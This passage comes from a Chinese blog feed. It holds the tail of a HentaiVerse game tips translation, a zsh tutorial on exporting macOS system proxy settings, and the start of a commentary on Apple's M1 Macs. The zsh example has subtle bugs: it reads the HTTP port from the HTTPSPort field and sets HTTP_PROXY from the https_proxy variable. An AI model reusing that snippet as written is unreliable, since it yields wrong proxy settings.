才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | <span class=\"hljs-built_in\">tee</span> -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 